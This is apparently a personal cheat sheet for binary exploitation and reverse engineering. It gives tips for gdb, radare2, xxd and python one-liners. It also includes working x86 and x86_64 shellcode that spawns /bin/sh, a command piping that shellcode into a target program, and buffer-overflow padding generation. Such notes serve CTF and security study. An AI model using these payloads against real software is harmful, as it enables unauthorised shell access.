____ ____ _  _ ____ ____ ____ _ _  _ ____ 
|__/ |___ |  | |___ |__/ [__  | |\ | | __ 
|  \ |___  \/  |___ |  \ ___] | | \| |__]

____ _  _ ___  _    ____ _ ___ ____ 
|___  \/  |__] |    |  | |  |  [__  
|___ _/\_ |    |___ |__| |  |  ___] 

#pipe shellcode and stdin to program
cat shellcode - | ./program

#x86_64 shellcode /bin/sh
\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05

#86 shellcode sh? bash?
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80
_  _ ___ _ _    ____ 
|  |  |  | |    [__  
|__|  |  | |___ ___] 

#echo hex
echo -e "\xef\xbe\xad\xde"

#print hex using python
python -c 'print "\xef\xbe\xad\xde"'

#generate data with python
$(python -c 'print "A" * 140')

#find length of shell code
python -c 'print len("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80")'
output: 24

#xxd tricks
#convert file to hexdump
xxd shellcode > shellcode.hex

#convert modifiy hex back to binary
xxd -r shellcode.hex > shellcode
____ ___  ___  
| __ |  \ |__] 
|__] |__/ |__] 

#gdb init file
put commands in ~/.gdbinit

#set gdb to intel syntax
set disassembly-flavor intel

#disable gdb's disabling of randomization
set disable-randomization off

#follow child during a fork (gdb default is parent)
set follow-fork-mode child

#print 15 instructions from main
x/15i main

#print string at address
x/1s 0xFFFFF

#mapped address spaces
i proc m

#RADARE2

#Using rarun2 to pass stdin/args from files/scripts
$cat foo.rr2
#!/usr/bin/rarun2
program=./pp400
arg0=10
stdin=foo.txt
chdir=/tmp

#then just run like so:
r2 -R foo.rr2 -d binary
#chroot=.
   ./foo.rr2
